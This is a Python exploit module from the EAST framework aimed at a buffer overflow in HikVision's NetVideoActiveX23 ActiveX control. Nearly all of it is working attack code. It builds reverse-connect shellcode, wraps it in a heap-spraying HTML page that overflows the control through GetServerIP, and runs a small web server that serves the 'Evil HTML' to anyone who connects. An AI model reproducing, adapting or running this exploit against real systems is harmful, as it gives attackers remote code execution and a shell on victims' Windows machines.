#!/usr/bin/env python
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution
# visit eastfw.com  eastexploits.com for more info
import sys
import re
import os
import socket
import random
import string
from struct import pack

sys.path.append("./core")
from Sploit import Sploit
sys.path.append("./shellcodes")
from Shellcodes import OSShellcodes

INFO={}
INFO['NAME']="efa_HikVision_Security_Systems_activex"
INFO['DESCRIPTION']="HikVision Security Systems activex Remote Overflow"
INFO['VENDOR']="http://www.hikvision.com/us/Tools_84.html"
INFO["CVE Name"]="0-day"
INFO["NOTES"]="""
Exploit-db.com  information:
    # Exploit Title: HikVision Security Systems ActiveX exploit designed for EAST framework
    # Google Dork:  none
    # Date: 19 October 2016
    # Exploit Author: EAST framework development team. Yuriy Gurkin
    # Vendor Homepage: http://www.hikvision.com/us
    # Software Link: http://www.hikvision.com/us/Tools_84.html  client software
    # Version: v2.5.0.5
    # Tested on: Windows XP, 7
    # CVE : 0day
    
General information:
Loaded File: C:\temp\WEBCAM~1\HIKVIS~1\NETVID~1.OCX
Name:        NETVIDEOACTIVEX23Lib
Lib GUID:    {99F388E9-F788-41D5-A103-8F4961539F88}
Version:     1.0
Lib Classes: 1

Class NetVideoActiveX23
GUID: {CAFCF48D-8E34-4490-8154-026191D73924}
Number of Interfaces: 1
Default Interface: _DNetVideoActiveX23
RegKey Safe for Script: True
RegkeySafe for Init: True
KillBitSet: False
"""

INFO['CHANGELOG']="13 Jan, 2016. Written by Gleg team."
INFO['PATH'] = "Exploits/"

PROPERTY = {}
PROPERTY['DESCRIPTION'] = "ActiveX 0-day"
PROPERTY['MODULE_TYPE'] = "Scada"

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["CONNECTBACK_PORT"] = "8089"

class exploit(Sploit):
    def __init__(self,
                port=8089, 
                logger=None):
        Sploit.__init__(self,logger=logger)
        self.port = port
        self.state = "running"
        return

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.port = int(self.args.get('CONNECTBACK_PORT', self.port))
        return

    def create_shellcode(self):
        self.CONNECTBACK_IP = socket.gethostbyname(socket.gethostname())
        if self.args['listener']:
            shellcode_type = 'reverse'
            port = int(self.args['listener']['PORT'])
        else:
            port = 9999
            shellcode_type = 'command'
        self.CONNECTBACK_PORT = port
        os_system = os_target = 'WINDOWS'
        os_arch = '32bit'
        s = OSShellcodes(os_target,
                        os_arch,
                        self.CONNECTBACK_IP,
                        self.CONNECTBACK_PORT)
        s.TIMESTAMP = 'codesys'
        shellcode = s.create_shellcode(
            shellcode_type,
            encode=0,
            debug=1
        )
        return shellcode

    def make_data(self, shellcode):
        filedata="""
        <html>
<object classid='clsid:CAFCF48D-8E34-4490-8154-026191D73924' id='target' ></object>
<script type='text/javascript' language="javascript">
ar=new Array();

function spray(buffer) {
    var hope   = unescape('%u9090%u9090');
    var unbuffer = unescape(buffer);
    var v      = 20 + unbuffer.length;

    while(hope.length<v)
         hope += hope;

    var fk = hope.substring(0, v);
    var bk = hope.substring(0, hope.length- v );
    delete v;
    delete hope;

    while(bk.length+v<0x40000) { 
       bk=bk+bk+fk;
    }
    for(i=0;i<3500;i++) {
       ar[i] = bk + unbuffer;
    }

}

spray(<SHELLCODE>);

        
buffer = "";
for (i = 0; i < 555; i++) buffer += unescape('%u9090%u9090');
target.GetServerIP (buffer);
</script>
</html>

        """
        if len(shellcode)%2:
            shellcode="\x90"+shellcode

        shell="unescape(\""
        i = 0
        while i < len(shellcode):
            shell += "%u"+"%02X%02X" %(ord(shellcode[i+1]),ord(shellcode[i]))     
            i += 2
        shell += "\")"
        filedata = filedata.replace("<SHELLCODE>", shell)
        return filedata

    def run(self):
        self.args()
        self.log("Generating shellcode")
        shellcode = self.create_shellcode()
        if not shellcode:
            self.log("Something goes wrong")
            return 0
        self.log("Generate Evil HTML")
        html = self.make_data(shellcode)
        self.log("Done")
        self.log("Starting web server")
        ip_server = "0.0.0.0"
        crlf = "\r\n"
        response = "HTTP/1.1 200 OK" + crlf
        response += "Content-Type: text/html" + crlf
        response += "Connection: close" + crlf
        response += "Server: Apache" + crlf
        response += "Content-Length: " + str(len(html))
        response += crlf + crlf + html + crlf
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server = (ip_server, 8089)
        s.bind(server)
        s.listen(1)
        while True:
            try:
                connection, client_address = s.accept()
                data = connection.recv(2048)
                self.log("Got request, sending payload")
                connection.send(response)
                self.log("exploit send")
                connection.close()
            except:
                print("EXCEPT")
        self.log('All done')
        self.finish(True)
        return 1

if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()